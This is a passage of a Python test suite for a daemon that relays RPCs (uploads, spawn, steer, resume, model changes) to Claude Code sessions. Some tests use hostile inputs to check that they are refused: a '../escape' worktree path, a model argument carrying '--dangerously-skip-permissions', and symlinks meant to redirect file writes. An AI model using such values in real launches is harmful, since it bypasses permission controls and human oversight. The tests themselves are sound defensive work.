                           "attachments": [{"index": 0, "state": "forwarded"}]}])
        self.assertEqual((got[0]["session"], got[0]["sub"]), (self.bridged.sid, None), "session-wide")
        self.assertNotIn("op_id", self.ledger()[n], "not kept once its end went up")
        kept = (bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(n) or {}
        self.assertEqual((kept.get("op"), (kept.get("end") or {}).get("state")), ("media", "forwarded"),
                         "the child kept the end beside the answer")

    def test_m5_a_refused_upload_fails_with_the_bridges_code_first_and_its_files_go(self):
        self.mod.refuse_media = ("not-main", "an upload goes to the main loop")
        asked = self.upload()
        o = self.refused(asked, "failed")
        self.assertEqual(o["error"]["message"], "not-main: an upload goes to the main loop")
        self.assertEqual(len(self.mod.ops("media")), 1, "it reached the bridge")
        self.assertEqual(self.uploads_of(self.root), [], "the files it saved are removed")
        self.assertNotIn("op_id", self.ledger()[asked["nonce"]])

    def test_m5_an_upload_needs_a_bridge_and_a_machine_that_runs_rpcs(self):
        self.refused(self.upload(session=self.plain.sid), "unsupported")
        policy.write({"read_only": True, "ceiling": "auto"})
        self.refused(self.upload(), "read-only")
        self.assertEqual(self.mod.ops("media"), [])
        self.assertEqual(self.uploads_of(self.root, self.plain.sid) + self.uploads_of(self.root), [])

    def test_m5_a_link_in_the_upload_path_refuses_it_before_the_bridge(self):
        base = os.path.realpath(os.path.join(tsp.T, "linked-" + uuidlib.uuid4().hex[:6]))
        elsewhere = os.path.join(tsp.T, "elsewhere-" + uuidlib.uuid4().hex[:6])
        os.makedirs(os.path.join(base, ".claude"))
        os.makedirs(elsewhere)
        os.symlink(elsewhere, os.path.join(base, ".claude", "desk-uploads"))
        self.mod.cwd = base
        o = self.refused(self.upload(), "failed")
        self.assertIn("link", o["error"]["message"])
        self.assertEqual(os.listdir(elsewhere), [], "nothing written through the link")
        self.assertEqual(self.mod.ops("media"), [], "nothing reached the bridge")

    def test_m5_a_collision_refuses_the_upload_and_leaves_what_it_never_made_its_own(self):
        nonce = codes.b64url(os.urandom(16))
        root = os.path.join(os.path.realpath(self.root), ".claude", "desk-uploads", self.bridged.sid)
        os.makedirs(root, exist_ok=True)
        theirs = {nonce + ".1.png": b"theirs", nonce + ".2.png": b"never reached"}
        for name, data in theirs.items():
            with open(os.path.join(root, name), "wb") as f:
                f.write(data)
        asked = self.send("media", {"session": self.bridged.sid, "delivery": "queued-turn", "attachments": self.attachments(
            ("a.png", "image/png", PNG), ("b.png", "image/png", PNG), ("c.png", "image/png", PNG))}, nonce=nonce)
        o = self.refused(asked, "failed")
        self.assertIn("other bytes", o["error"]["message"])
        self.assertEqual(self.uploads_of(self.root), sorted(theirs), "only the file it created went")
        self.assertEqual(self.mod.ops("media"), [], "nothing reached the bridge")

    def test_m5_a_linked_exclude_is_reported_and_the_upload_goes_on(self):
        repo = os.path.realpath(os.path.join(tsp.T, "xrepo-" + uuidlib.uuid4().hex[:6]))
        os.makedirs(repo)
        subprocess.run(["git", "init", "-q", repo], check=True)
        outside = os.path.join(tsp.T, "outside-" + uuidlib.uuid4().hex[:6])
        with open(outside, "w") as f:
            f.write("theirs\n")
        info = os.path.join(repo, ".git", "info")
        os.makedirs(info, exist_ok=True)
        if os.path.lexists(os.path.join(info, "exclude")):
            os.unlink(os.path.join(info, "exclude"))
        os.symlink(outside, os.path.join(info, "exclude"))
        self.mod.cwd = repo
        self.assertEqual(self.outcome(self.upload())["state"], "done", "not excluded is not fatal")
        with open(outside) as f:
            self.assertEqual(f.read(), "theirs\n", "nothing appended through the link")

    def test_m5_a_restart_between_save_and_acceptance_runs_nothing_again(self):
        """The daemon saved the files and stopped before the bridge was told:
        the claim finds no answer in the child's kept file and is answered
        `interrupted` once its window passes; the hub's resend is answered
        from the ledger, and the files are left to the sweep."""
        rpc = sign(KEY, "media", self.pid, {"session": self.bridged.sid, "delivery": "queued-turn",
                                            "attachments": self.attachments(("a.png", "image/png", PNG))})
        n = rpc["nonce"]
        root, names = media.save(os.path.realpath(self.root), self.bridged.sid, n, rpc["args"]["attachments"])
        sminos.write_json(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE), {n: {
            "project": self.pid, "rpc": "media", "session": self.bridged.sid, "at": self.clock[0],
            "media_root": root, "media_paths": names}})
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the restart
        self.r.receive(rpc, self.here)                                     # the hub sends it again meanwhile
        self.assertEqual(results(self.collect(), n), [], "a claim being reconciled: its result follows")
        self.clock[0] += rpcs.STEER_TRACE_S + 1
        self.r.next_reconcile = 0
        o = self.outcome(rpc)
        self.assertEqual((o["state"], o["error"]["code"]), ("failed", "interrupted"))
        self.r.receive(rpc, self.here)
        self.assertEqual(self.mod.ops("media") + self.mod.ops("read"), [], "never run again")
        self.assertIn(root, media.roots(self.bridged.sid), "its root is recorded for the sweep")

    def test_m5_a_restart_between_acceptance_and_answer_is_answered_from_the_childs_kept_answer(self):
        """The bridge held the upload and the daemon stopped before its
        outcome was kept: the restart answers it `queued` from the child's
        kept answer and the claim's root, and the end the child kept while
        the daemon was down goes up as op."""
        self.following()
        self.mod.hold_runs = True
        asked = self.upload()
        n = asked["nonce"]
        first = self.outcome(asked)
        self.assertEqual(first["state"], "done")
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        entries[n] = {k: v for k, v in entries[n].items()
                      if k not in ("op_id", "outcome", "done_at", "acked")}   # the claim the stop left
        sminos.write_json(path, entries)
        self.mod.post(*self.mod.held_runs)
        kept = lambda: ((bridgemod.load_kept(self.bridged.sid).get("rpcs") or {}).get(n) or {}).get("end")
        self.assertTrue(wait_for(kept), "the child kept the end beside the answer")
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.r.kinds = frozenset({"op"})
        self.frames = []
        self.assertEqual(self.outcome(asked), first, "the same answer, root and paths included")
        got = wait_for(lambda: self.op_messages())
        self.assertEqual([(m["body"]["op"], m["body"]["rpc"], m["body"]["state"], m["body"]["phase"]) for m in got],
                         [("media", n, "forwarded", "end")])
        self.assertEqual(len(self.mod.ops("media")), 1, "the bridge was asked once")

    def test_m5_a_refusal_reconciled_after_a_restart_removes_the_files(self):
        """The bridge refused the upload and the daemon stopped before its
        outcome was kept: the restart answers it failed from the child's kept
        refusal, and removes what was saved for it."""
        self.mod.refuse_media = ("not-main", "an upload goes to the main loop")
        asked = self.upload()
        n = asked["nonce"]
        self.refused(asked, "failed")
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        entries = self.ledger()
        entries[n] = {k: v for k, v in entries[n].items() if k not in ("outcome", "done_at", "acked")}
        sminos.write_json(path, entries)
        media.save(os.path.realpath(self.root), self.bridged.sid, n, asked["args"]["attachments"])   # as the stop left them
        self.assertEqual(self.uploads_of(self.root), [n + ".0.png"])
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.frames = []
        o = self.refused(asked, "failed")
        self.assertEqual(o["error"]["message"], "not-main: an upload goes to the main loop")
        self.assertEqual(self.uploads_of(self.root), [], "its files removed")

    def test_m5_an_upload_the_bridge_already_holds_counts_as_held(self):
        self.assertEqual(rpcs.media_held({"ok": True, "result": {"duplicate": True, "upload": "u1"}},
                                         {"media_root": "/r", "media_paths": ["u1.0.png"]}),
                         {"state": "done", "result": {"queued": True, "upload": "u1", "intake": "native-read",
                                                      "root": "/r", "paths": ["u1.0.png"]}})


    def test_g_spawn_and_retire_through_sminos(self):
        tpr.set_policy({"read_only": False, "ceiling": "acceptEdits"})
        before = len(launches(self.claude))
        rpc = self.send("spawn", {"checkout": self.root, "brief": "tidy the docs", "model": "claude-sonnet-4-5",
                                  "effort": "low"})
        o = self.outcome(rpc, timeout=60)
        self.assertEqual(o["state"], "done", o)
        sid, alias = o["result"]["session"], o["result"]["alias"]
        self.assertTrue(sminos.UUID_RE.match(sid), o)
        bg = launches(self.claude)[before:]
        self.assertEqual(len(bg), 1)
        argv = bg[0]
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "acceptEdits",
                         "no mode asked: the ceiling, passed explicitly")
        self.assertEqual(argv[argv.index("--model") + 1], "claude-sonnet-4-5")
        self.assertEqual(argv[argv.index("--effort") + 1], "low")
        self.assertEqual(argv[argv.index("-n") + 1], alias)
        seat = [s for s in sminos.seats() if s.get("rpc_nonce") == rpc["nonce"]]
        self.assertEqual([(s["current"], s["alias"], s["brief"]) for s in seat], [(sid, alias, "tidy the docs")],
                         "the seat carries its nonce, and the brief as its in-charge line")
        sminos.forget_caches()
        joined = sminos.view_of(self.project, titles=False).info[sid]["joined"]
        self.assertEqual(joined["by"], MEMBER, "joined by the member who asked (composite 21c32db7)")
        again = self.send("spawn", {"checkout": self.root, "brief": "tidy the docs", "model": "claude-sonnet-4-5",
                                    "effort": "low"}, nonce=rpc["nonce"], created=rpc["created"])
        self.assertTrue(wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 2))
        self.r.receive(rpc, self.here)
        got = wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 3 and results(self.frames, rpc["nonce"]))
        self.assertEqual(got, [o, o, o], "a retry, and the same RPC again: each answered from the ledger")
        self.assertEqual(again["nonce"], rpc["nonce"])
        self.assertEqual(len(launches(self.claude)) - before, 1, "one session")

        self.here.sessions.add(sid)
        retire = self.send("retire", {"session": sid})
        self.assertEqual(self.outcome(retire, timeout=60), {"state": "done", "result": {}})
        sminos.forget_caches()
        latest = sminos.view_of(self.project, titles=False).info[sid]["latest"]
        self.assertEqual(latest["kind"], "retired", "recorded as sminos retire records it")
        self.assertEqual(latest["by"], MEMBER, "retired by the member who asked")

    def test_g_a_permission_mode_at_or_below_the_ceiling_is_passed(self):
        tpr.set_policy({"read_only": False, "ceiling": "auto"})
        before = len(launches(self.claude))
        rpc = self.send("spawn", {"checkout": self.root, "brief": "plan it", "permission_mode": "plan",
                                  "worktree": "web-plan"})
        self.assertEqual(self.outcome(rpc, timeout=60)["state"], "done")
        argv = launches(self.claude)[before]
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "plan")
        self.assertEqual(argv[argv.index("--worktree") + 1], "web-plan")
        bad = self.send("spawn", {"checkout": self.root, "brief": "b", "worktree": "../escape"})
        self.refused(bad, "bad-shape")
        flag = self.send("spawn", {"checkout": self.root, "brief": "b", "model": "--dangerously-skip-permissions"})
        self.refused(flag, "bad-shape")

    # ------------------------------------------------ at most once, across a stop

    def claim(self, key, name, session, at, **extra):
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        d = self.ledger()
        d[key] = {"project": self.pid, "rpc": name, "session": session, "at": at, **extra}
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump(d, f)

    def reconciled(self, r, nonce, timeout=20.0):
        """The results `r` gives for a nonce once a reconciliation answers it
        (each try one more reconciliation, the clock where it is): a claim a
        worker holds (a Resume's copy check) is answered after it."""
        def got():
            r.next_reconcile = 0.0
            return results(r.due({self.pid}), nonce)
        return wait_for(got, timeout) or []

    def test_h_a_claim_left_without_an_outcome_is_reconciled_from_its_trace(self):
        """A claimed steer ran when the bridge's child kept the mod's answer
        under its nonce. A user row of the same words is no trace of it, one
        written before the claim or after: the same words may come another
        way (D's claim is as the previous daemon kept it, with its text's
        hash)."""
        now = time.time()
        self.mod.turn = "turn-h"
        self.claim("AAAAAAAAAAAAAAAAAAAAAA", "steer", self.bridged.sid, now)
        # The daemon stops here: the command reached the session, its answer was never read.
        landed = rpcs.steer(rpcs.bridge.endpoint(self.bridged.sid), "the steer that landed", "AAAAAAAAAAAAAAAAAAAAAA")
        self.assertEqual(landed, {"state": "done", "result": {"row": self.mod.rows[-1]}})
        self.claim("BBBBBBBBBBBBBBBBBBBBBA", "steer", self.bridged.sid, now - 3600)
        self.claim("CCCCCCCCCCCCCCCCCCCCCA", "interrupt", self.bridged.sid, now)
        same = "the same words, sent another way"
        for at in (now - 1, now + 0.5):
            append_row(self.bridged.sid, {"type": "user", "uuid": str(uuidlib.uuid4()), "timestamp": iso(at),
                                          "message": {"role": "user", "content": [{"type": "text", "text": same}]}})
        self.claim("DDDDDDDDDDDDDDDDDDDDDA", "steer", self.bridged.sid, now,
                   text_sha256=hashlib.sha256(same.encode()).hexdigest())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        frames = r.due({self.pid})
        self.assertEqual(results(frames, "AAAAAAAAAAAAAAAAAAAAAA"), [landed],
                         "the bridge's child kept the mod's answer under the steer's nonce")
        for nonce in ("BBBBBBBBBBBBBBBBBBBBBA", "CCCCCCCCCCCCCCCCCCCCCA"):
            o = results(frames, nonce)
            self.assertEqual([x["error"]["code"] for x in o], ["interrupted"], nonce)
        self.assertEqual(results(frames, "DDDDDDDDDDDDDDDDDDDDDA"), [],
                         "rows of its words are no trace: its answer may still come, so it waits")
        self.assertEqual(self.ledger()["DDDDDDDDDDDDDDDDDDDDDA"].get("outcome"), None)
        self.clock[0] = now + rpcs.STEER_TRACE_S + 1
        o = results(r.due({self.pid}), "DDDDDDDDDDDDDDDDDDDDDA")
        self.assertEqual([x["error"]["code"] for x in o], ["interrupted"], "and no answer came")

    def test_h_a_steer_answered_after_its_wait_ran_out_is_kept_under_its_nonce(self):
        """The command's wait ended (504) before the mod answered: the answer
        that comes after is kept under the nonce all the same, so a daemon
        that stopped meanwhile reconciles the steer as done, not interrupted."""
        nonce = "QQQQQQQQQQQQQQQQQQQQQA"
        self.mod.turn = "turn-late"
        self.mod.hold = 1.0
        self.claim(nonce, "steer", self.bridged.sid, time.time())
        status, _ = rpcs.control.post_command(rpcs.bridge.endpoint(self.bridged.sid),
                                              {"op": "steer", "text": "the steer answered late", "rpc": nonce},
                                              wait_ms=300)
        self.assertEqual(status, 504)
        kept = wait_for(lambda: (rpcs.bridge.load_kept(self.bridged.sid).get("rpcs") or {}).get(nonce), 10.0)
        self.assertEqual(kept, {"op": "steer", "ok": True, "result": {"row": self.mod.rows[-1]}},
                         "the late answer is kept under the steer's nonce")
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(results(r.due({self.pid}), nonce), [{"state": "done", "result": {"row": self.mod.rows[-1]}}])

    def test_h_a_claimed_spawn_is_found_by_its_nonce(self):
        nonce = "EEEEEEEEEEEEEEEEEEEEEA"
        sid = str(uuidlib.uuid4())
        sminos.meta_set(sid, {"uuid": sid, "current": sid, "alias": "web-found", "group": "rpcproj", "cwd": self.root,
                              "status": "working", "rpc_nonce": nonce})
        self.claim(nonce, "spawn", None, time.time())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(results(r.due({self.pid}), nonce),
                         [{"state": "done", "result": {"session": sid, "alias": "web-found"}}])

    def stale_file(self, override):
        """The child's kept file left at `override` (its write failed, DX5)."""
        import sminos_bridge as bridge
        with open(bridge.kept_path(self.bridged.sid), "w") as f:
            json.dump({"override": override, "delivered": {}}, f)

    def test_f_a_partial_model_change_builds_on_the_bridges_live_choice(self):
        """The unchanged field keeps what the session's bridge holds now:
        not a stale kept file, and not this daemon's own last answer when
        another writer (the owner's `sminos model`) changed it since."""
        import sminos_bridge as bridge
        sid = self.bridged.sid
        self.mod.post({"type": "model", "model": "old-model", "effort": "low"})
        wait_for(lambda: bridge.load_kept(sid)["override"] == {"model": "old-model", "effort": "low"})
        # A stale kept file is not read.
        first = self.send("model", {"session": sid, "model": "new-model"})
        self.assertEqual(self.outcome(first), {"state": "done", "result": {"model": "new-model", "effort": "low"}})
        self.stale_file({"model": "old-model", "effort": "low"})
        second = self.send("model", {"session": sid, "effort": "high"})
        self.assertEqual(self.outcome(second), {"state": "done", "result": {"model": "new-model", "effort": "high"}},
                         "the stale file does not bring old-model back")
        # Web, then the owner's CLI, then a web partial change.
        web = self.send("model", {"session": sid, "model": "web-model"})
        self.assertEqual(self.outcome(web)["result"]["model"], "web-model")
        r = cli("model", sid, "cli-model", "--effort", "medium")
        self.assertEqual(r.returncode, 0, r.stderr)
        partial = self.send("model", {"session": sid, "effort": "max"})
        self.assertEqual(self.outcome(partial), {"state": "done", "result": {"model": "cli-model", "effort": "max"}},
                         "the owner's newer model stands")
        self.assertEqual(self.mod.ops("model")[-1]["model"], "cli-model")
        # The bridge's state cannot be read: no partial change, nothing sent.
        sent = len(self.mod.ops("model"))
        with mock.patch.object(rpcs, "bridge_snapshot", side_effect=OSError("the bridge did not answer")):
            unread = self.send("model", {"session": sid, "effort": "low"})
            o = self.outcome(unread)
            self.assertEqual(o["state"], "failed", o)
            self.assertIn("could not be read", o["error"]["message"])
            self.assertEqual(len(self.mod.ops("model")), sent, "nothing was sent")
            whole = self.send("model", {"session": sid, "model": "default", "effort": "medium"})
            self.assertEqual(self.outcome(whole), {"state": "done", "result": {"model": None, "effort": "medium"}},
                             "a change naming both reads nothing")

    def test_f_concurrent_partial_model_changes_both_hold(self):
        """A model-only and an effort-only RPC at once: each keeps the
        other's change (the read-modify-write is serialized per session)."""
        import sminos_bridge as bridge
        self.mod.post({"type": "model", "model": None, "effort": None})
        wait_for(lambda: bridge.load_kept(self.bridged.sid)["override"] is None)
        self.mod.hold = 0.4
        m = self.send("model", {"session": self.bridged.sid, "model": "claude-opus-4-1"})
        e = self.send("model", {"session": self.bridged.sid, "effort": "max"})
        self.assertEqual(self.outcome(m)["state"], "done")
        self.assertEqual(self.outcome(e)["state"], "done")
        self.assertEqual({k: self.mod.ops("model")[-1].get(k) for k in ("model", "effort")},
                         {"model": "claude-opus-4-1", "effort": "max"}, "the second carried the first's change")
        self.assertTrue(wait_for(lambda: bridge.load_kept(self.bridged.sid)["override"] ==
                                 {"model": "claude-opus-4-1", "effort": "max"}), "and both are in force")

    def test_h_an_unreadable_ledger_runs_nothing_and_is_kept(self):
        """A ledger that exists and cannot be read could hold claims: every
        RPC is refused, reported, and the file is never replaced."""
        path = os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write('{"half-written": ')
        self.mod.turn = "t-l"
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.r = r
        rpc = self.send("steer", {"session": self.bridged.sid, "text": "twice?"})
        o = self.outcome(rpc)
        self.assertEqual(o["state"], "failed")
        self.assertIn("ledger", o["error"]["message"])
        self.assertEqual(self.mod.ops("steer"), [], "nothing ran")
        with open(path) as f:
            self.assertEqual(f.read(), '{"half-written": ', "the unreadable ledger is left as it was")
        # Readable again (the owner repaired it): its claims stand, and a
        # nonce it knows is answered from it, never run.
        done_before = {"state": "done", "result": {"row": "r-1"}}
        with open(path, "w") as f:
            json.dump({rpc["nonce"]: {"project": self.pid, "rpc": "steer", "session": self.bridged.sid,
                                      "at": time.time(), "outcome": done_before, "acked": False}}, f)
        self.r.receive(rpc, self.here)
        got = wait_for(lambda: done_before in results(self.collect(), rpc["nonce"]) and True)
        self.assertTrue(got, "answered from the repaired ledger")
        self.assertEqual(self.mod.ops("steer"), [], "and never run")

    def test_h_a_provisional_spawn_seat_waits_for_its_uuid(self):
        nonce = "FFFFFFFFFFFFFFFFFFFFFA"
        rec = str(uuidlib.uuid4())
        sminos.meta_set(rec, {"uuid": rec, "current": "", "alias": "web-prov", "group": "rpcproj", "cwd": self.root,
                              "status": "working", "rpc_nonce": nonce})
        self.claim(nonce, "spawn", None, time.time())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual(results(r.due({self.pid}), nonce), [], "a launch still polling for its uuid is not failed")
        self.assertIsNone(self.ledger()[nonce].get("outcome"))
        sid = str(uuidlib.uuid4())
        sminos.meta_set(rec, {"current": sid})
        self.clock[0] += rpcs.RECONCILE_EVERY + 0.1
        self.assertEqual(results(r.due({self.pid}), nonce),
                         [{"state": "done", "result": {"session": sid, "alias": "web-prov"}}], "then found")
        # An established failed launch is failed at once.
        nonce2 = "GGGGGGGGGGGGGGGGGGGGGA"
        rec2 = str(uuidlib.uuid4())
        sminos.meta_set(rec2, {"uuid": rec2, "current": "", "alias": "web-err", "group": "rpcproj",
                               "cwd": self.root, "status": "error", "pending_short": "abcd1234", "rpc_nonce": nonce2})
        self.claim(nonce2, "spawn", None, time.time())
        r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        self.assertEqual([o["error"]["code"] for o in results(r.due({self.pid}), nonce2)], ["failed"])

    def test_i_every_compaction_of_a_bridged_session_is_relayed(self):
        """One the session started itself carries `rpc: null`; one an RPC
        asked for, that RPC's nonce."""
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({self.bridged.sid: self.pid})
        try:
            self.assertTrue(wait_for(lambda: reqs.take() or self.bridged.sid in reqs.synced))
            self.mod.post({"type": "compact", "phase": "start", "id": "auto-1"},
                          {"type": "compact", "phase": "end", "id": "auto-1", "tokensBefore": 5000, "tokensAfter": 900})
            asked = self.send("compact", {"session": self.bridged.sid})

            def compacts():
                reqs.take()
                self.r.compacted(reqs.take_compacts())
                return [f["message"]["body"] for f in self.collect() if f.get("t") == "session"
                        and f["message"]["kind"] == "compact"]
            got = wait_for(lambda: len(compacts()) >= 4 and compacts())
            self.assertTrue(got, "four compact messages: %s" % compacts())
            self.assertEqual([b for b in got if b["rpc"] is None],
                             [{"rpc": None, "phase": "start"},
                              {"rpc": None, "phase": "end", "tokensBefore": 5000, "tokensAfter": 900}])
            self.assertEqual([b["phase"] for b in got if b["rpc"] == asked["nonce"]], ["start", "end"])
        finally:
            reqs.close()

    def test_i_a_compaction_held_for_its_turn_keeps_its_nonce_across_a_restart(self):
        """A compact answered `at: "turn-end"` runs after the daemon restarted:
        its outcome still carries the RPC's nonce, and the association is
        forgotten at its end."""
        reqs = requests.Requests(KEY, "testhost")
        reqs.follow({self.bridged.sid: self.pid})
        try:
            self.assertTrue(wait_for(lambda: reqs.take() or self.bridged.sid in reqs.synced))
            self.mod.turn = "turn-r"
            asked = self.send("compact", {"session": self.bridged.sid})
            self.assertEqual(self.outcome(asked), {"state": "done", "result": {"at": "turn-end"}})
            cid = self.mod.ops("compact")[-1]["id"]
            self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])   # the daemon restarted
            self.frames = []
            self.mod.post({"type": "compact", "phase": "start", "id": cid},
                          {"type": "compact", "phase": "end", "id": cid, "tokensBefore": 7000, "tokensAfter": 800})

            def compacts():
                reqs.take()
                self.r.compacted(reqs.take_compacts())
                return [f["message"]["body"] for f in self.collect() if f.get("t") == "session"
                        and f["message"]["kind"] == "compact"]
            got = wait_for(lambda: len(compacts()) >= 2 and compacts())
            self.assertTrue(got, "the compaction's start and end: %s" % compacts())
            self.assertEqual([(b["rpc"], b["phase"]) for b in got], [(asked["nonce"], "start"),
                                                                     (asked["nonce"], "end")])
            self.assertNotIn(cid, rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0]).compact_ids,
                             "forgotten once its compaction ended")
        finally:
            reqs.close()

    def test_e_a_bridge_that_breaks_off_its_answer_leaves_no_rpc_unanswered(self):
        """A bridge that exits mid-response raises an HTTP protocol error, not
        an OSError: the digest check refuses, the decision fails, and any
        other breakage while planning is a reported `failed`, never an RPC
        left without an answer."""
        import http.client
        tool_input = {"command": "make cut"}
        self.mod.raise_("toolu_cut", input_=tool_input)
        wait_for(lambda: self.request_info("toolu_cut")[0] == 200)
        args = {"session": self.bridged.sid, "decision": "allow",
                "digest": digest_of(self.bridged.sid, "toolu_cut", "Bash", tool_input)}
        real = rpcs.bridge.request

        def cut(path, method, url, *a, **kw):
            if url.startswith("/requests/"):
                raise http.client.IncompleteRead(b'{"requ', 40)
            return real(path, method, url, *a, **kw)

        with mock.patch.object(rpcs.bridge, "request", side_effect=cut):
            o = self.refused(self.send("decide", args), "not-pending")
            self.assertIn("IncompleteRead", o["error"]["message"])
            with self.assertRaises(rpcs.Refused) as r:
                rpcs.decide(rpcs.bridge.endpoint(self.bridged.sid), "toolu_cut", {"behavior": "allow", "by": MEMBER})
            self.assertEqual(r.exception.outcome["error"]["code"], "failed")
        with mock.patch.object(rpcs, "check_digest", side_effect=RuntimeError("the digest check broke")):
            rpc = self.send("decide", args)
            o = self.refused(rpc, "failed")
            self.assertIn("the digest check broke", o["error"]["message"])
        self.assertEqual(self.ledger()[rpc["nonce"]]["outcome"], o, "kept: the nonce's one answer")
        self.assertTrue(wait_for(lambda: self.collect() is not None and not self.r.flight), "nothing left in flight")
        self.mod.settle("toolu_cut", outcome="deny", winner="terminal", by="terminal")

    # ------------------------------------------------ resume

    def test_j_resume_brings_an_ended_terminal_session_back_under_its_id(self):
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        rpc = self.send("resume", {"session": sid})
        self.assertEqual(self.outcome(rpc, timeout=60), {"state": "done", "result": {"session": sid}})
        self.assertEqual(resumes(self.claude, sid), [{"args": ["--bg", "--resume", sid], "cwd": os.path.realpath(
            self.root)}], "claude --bg --resume <session> in its working directory, no other flag")
        self.assertEqual([(r["kind"], r.get("jobId")) for r in holders_of(sid)], [("bg", sid[:8])],
                         "a --bg job holds it, under its own id")
        sminos.reconcile(tpr.project_of(self.root))
        latest = sminos.view_of(tpr.project_of(self.root), titles=False).info[sid]["latest"]
        self.assertEqual(latest["kind"], "joined", "it rejoins")
        self.r.receive(rpc, self.here)
        self.assertTrue(wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 2))
        again = self.send("resume", {"session": sid})
        self.assertIn("running here", self.refused(again, "session-live")["error"]["message"])
        self.assertEqual(len(resumes(self.claude, sid)), 1, "launched once")

    def test_j_a_session_whose_last_launch_was_lane_b_is_not_resumed_from_the_desk(self):
        """O12 M3: reopening a MAWS lane B session is MAWS's. A session that
        ran as lane A and was later reopened by MAWS as lane B, under the same
        id, has its record's controller at B (each launch's bridge verdict),
        and the desk's Resume of it after it ends is refused `lane-b`, nothing
        launched; its controller back at A, it resumes as any ended session."""
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        self.assertIsNotNone(sminos.session_record(sid), "the session has its record (O12 M1)")
        self.assertTrue(sminos.set_session_controller(sid, "A"), "it ran as lane A")
        self.assertTrue(sminos.set_session_controller(sid, "B"), "then MAWS reopened it as lane B")
        rpc = self.send("resume", {"session": sid})
        o = self.refused(rpc, "lane-b")
        self.assertIn("MAWS", o["error"]["message"])
        self.assertEqual(resumes(self.claude, sid), [], "nothing launched")
        self.assertNotIn("launched_at", self.ledger()[rpc["nonce"]], "refused before the claim")
        self.assertTrue(sminos.set_session_controller(sid, "A"))
        self.assertEqual(self.outcome(self.send("resume", {"session": sid}), timeout=60),
                         {"state": "done", "result": {"session": sid}})
        for h in holders_of(sid):
            os.kill(h["pid"], signal.SIGKILL)

    def test_j_an_observers_refusal_is_the_rpcs_answer_lane_b(self):
        """O12 M3: the bridge of a MAWS lane B session refuses every control
        op `lane-b`, and its child refuses the decision route the same: the
        RPC is answered with that code, not a generic failure."""
        self.mod.observer = True
        self.mod.turn = "t1"
        for name, args in (("steer", {"text": "x"}), ("interrupt", {}), ("compact", {}),
                           ("command", {"name": "rename", "args": "x"}), ("btw", {"prompt": "why?"})):
            o = self.refused(self.send(name, {"session": self.bridged.sid, **args}), "lane-b")
            self.assertIn("MAWS controls this session", o["error"]["message"])
        asked = self.upload()
        self.refused(asked, "lane-b")
        self.assertEqual(len(self.mod.ops("media")), 1, "it reached the bridge")
        self.assertEqual(self.uploads_of(self.root), [], "the files saved for a refused upload are removed")
        with mock.patch.object(rpcs.bridge, "request",
                               return_value=(409, {"error": "MAWS controls this session", "code": "lane-b"})):
            with self.assertRaises(rpcs.Refused) as r:
                rpcs.decide(rpcs.bridge.endpoint(self.bridged.sid), "toolu_x", {"behavior": "allow", "by": MEMBER})
        self.assertEqual(r.exception.outcome["error"]["code"], "lane-b")

    def test_j_a_session_this_machine_holds_no_transcript_of_is_not_resumed(self):
        """A --bg copy that ended before it wrote a row: `claude --resume`
        would start an empty session under its id and call it done."""
        sid = ended_session(self.root)
        os.unlink(transcript(sid))
        self.here.sessions.add(sid)
        rpc = self.send("resume", {"session": sid})
        o = self.refused(rpc, "unsupported")
        self.assertIn("no transcript", o["error"]["message"])
        self.assertEqual(resumes(self.claude, sid), [], "nothing launched")
        self.assertNotIn("launched_at", self.ledger()[rpc["nonce"]], "refused before the claim")

    def test_j_resume_is_refused_while_the_session_is_live(self):
        self.refused(self.send("resume", {"session": self.plain.sid}), "session-live")
        self.refused(self.send("resume", {"session": self.bridged.sid}), "session-live")
        self.assertEqual(resumes(self.claude, self.plain.sid) + resumes(self.claude, self.bridged.sid), [])

    def test_j_two_resumes_at_once_start_one_session(self):
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        with open(os.path.join(self.claude, "bg-sleep"), "w") as f:
            f.write("1.5")
        try:
            a = self.send("resume", {"session": sid})
            b = self.send("resume", {"session": sid})
            got = sorted((o["state"], (o.get("error") or {}).get("code")) for o in (self.outcome(a, 60),
                                                                                      self.outcome(b, 60)))
        finally:
            os.unlink(os.path.join(self.claude, "bg-sleep"))
        self.assertEqual(got, [("done", None), ("failed", "session-live")])
        self.assertEqual(len(resumes(self.claude, sid)), 1, "one launch")
        self.assertEqual(len(holders_of(sid)), 1, "one session holds the id")

    def test_j_a_resume_racing_the_owner_reopening_stops_the_copy(self):
        sid = ended_session(self.root)
        self.here.sessions.add(sid)
        open(os.path.join(self.claude, "reopen-first"), "w").close()
        o = self.refused(self.send("resume", {"session": sid}), "copy-started")
        self.assertIn("stopped", o["error"]["message"])
        self.assertEqual([r["kind"] for r in holders_of(sid)], ["interactive"],
